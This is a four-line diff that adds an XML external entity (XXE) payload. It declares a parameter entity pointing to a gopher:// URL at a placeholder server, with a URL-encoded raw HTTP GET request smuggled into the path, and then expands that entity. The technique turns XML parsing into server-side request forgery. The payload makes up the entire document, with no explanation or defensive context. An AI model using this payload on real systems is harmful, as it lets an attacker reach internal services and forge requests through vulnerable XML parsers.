@@ -1,0 +1,4 @@
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "gopher://YOUR_SERVER_URL:70/_GET%20/index.php%20HTTP/1.1%0d%0aHost:%20... ">
+  %xxe;
+]>
